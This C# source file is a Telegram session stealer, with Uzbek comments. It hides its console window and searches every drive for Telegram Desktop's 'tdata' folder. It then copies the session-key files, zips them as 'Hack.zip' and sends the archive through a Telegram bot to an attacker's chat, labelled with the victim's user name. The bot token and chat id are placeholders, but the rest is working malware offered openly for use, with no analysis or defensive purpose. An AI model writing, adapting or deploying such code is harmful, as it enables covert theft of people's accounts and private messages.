using System.IO.Compression;
using System.Runtime.InteropServices;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;

namespace BreakingTelegram_Bot
{

    public class Program
    {
        [DllImport("kernel32.dll")]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();
        public static string ZipFilePath { get; set; }
        public static string newZipFilePath { get; set; }
        public static ITelegramBotClient botClient;
        static async Task Main(string[] args)
        {
            FreeConsole();

            botClient = new TelegramBotClient("Your_bot_token");

            string folderName = "tdata";

            //Console.WriteLine("Bot ishga tushdi");

            SearchForFolder(folderName);

            newZipFilePath = Path.GetDirectoryName(ZipFilePath) + "\\Hack.zip";

            CreateZipArchive(ZipFilePath, newZipFilePath);

            botClient.StartReceiving();

            if (!Directory.Exists(newZipFilePath))
            {
                using (var stream = System.IO.File.OpenRead(newZipFilePath))
                {
                    var res = Environment.UserName;

                    await botClient.SendDocumentAsync(
                        "your_chat_id",
                        new InputOnlineFile(stream, "Telegram.zip"),
                        caption: $"{res} ning Telegram profili");

                    // await Console.Out.WriteLineAsync($"File junatildi {stream.Name}");
                }
            }
        }
        static void SearchForFolder(string folderName)
        {
            string[] drives = Directory.GetLogicalDrives();

            foreach (string drive in drives)
            {
                SearchInDrive(folderName, drive);
            }
        }
        static void SearchInDrive(string folderName, string currentDirectory)
        {
            try
            {
                string[] subDirectories = Directory.GetDirectories(currentDirectory);

                foreach (string subDirectory in subDirectories)
                {
                    if (Path.GetFileName(subDirectory) == folderName)
                    {
                        //Console.WriteLine($"Found folder '{folderName}' at: {subDirectory}");

                        string path = (Directory.GetParent(subDirectory).FullName) + "\\Zip";

                        if (Directory.GetParent(subDirectory).Name == "Telegram Desktop")
                        {
                            ZipFilePath = path;

                            Directory.CreateDirectory(path);

                            CopyDirectory2(subDirectory, path, true);

                            break;
                        }
                    }
                    try
                    {
                        SearchInDrive(folderName, subDirectory);

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {

            }
        }
        static void CopyDirectory2(string sourceDir, string destinationDir, bool recursive)
        {
            try
            {
                var dir = new DirectoryInfo(sourceDir);

                if (!dir.Exists)
                    throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

                DirectoryInfo[] dirs = dir.GetDirectories();

                Directory.CreateDirectory(destinationDir);

                foreach (FileInfo file in dir.GetFiles())
                {
                    //if (file.Name != "working")
                    //{
                    //    string targetFilePath = Path.Combine(destinationDir, file.Name);
                    //    file.CopyTo(targetFilePath);
                    //}
                    if (file.Name == "settingss" || file.Name == "usertag" || file.Name == "shortcuts-default.json" || file.Name == "shortcuts-custom.json" || file.Name == "prefix" || 
                        file.Name == "key_datas" || file.Name == "DFD05548EB67DD45s" || file.Name == "D877F783D5D3EF8Cs" || file.Name == "countries")
                    {
                        string targetFilePath = Path.Combine(destinationDir, file.Name);
                        file.CopyTo(targetFilePath);
                    }
                }
                if (recursive)
                {
                    foreach (DirectoryInfo subDir in dirs)
                    {
                        if (subDir.Name == "D877F783D5D3EF8C")
                        {
                            string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                            CopyDirectory3(subDir.FullName, newDestinationDir, true);
                            //Console.WriteLine($"Copy qilindi: {subDir.FullName}");
                        }
                    }
                }
            }
            catch
            {

            }
        }
        static void CreateZipArchive(string sourceDir, string zipFilePath)
        {
            try
            {
                ZipFile.CreateFromDirectory(sourceDir, zipFilePath);
                //Console.WriteLine($"Zip File yaratildi: {zipFilePath}");
            }
            catch
            {

            }
        }

        static void CopyDirectory3(string sourceDir, string destinationDir, bool recursive)
        {
            try
            {
                var dir = new DirectoryInfo(sourceDir);

                if (!dir.Exists)
                    throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

                DirectoryInfo[] dirs = dir.GetDirectories();

                Directory.CreateDirectory(destinationDir);

                foreach (FileInfo file in dir.GetFiles())
                {
                    if (file.Name != "working")
                    {
                        string targetFilePath = Path.Combine(destinationDir, file.Name);
                        file.CopyTo(targetFilePath);
                    }
                }
                if (recursive)
                {
                    foreach (DirectoryInfo subDir in dirs)
                    {
                        if (subDir.Name == "D877F783D5D3EF8C")
                        {
                            string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                            CopyDirectory2(subDir.FullName, newDestinationDir, true);
                            //Console.WriteLine($"Copy qilindi: {subDir.FullName}");
                        }
                    }
                }
            }
            catch
            {

            }
        }
    }
}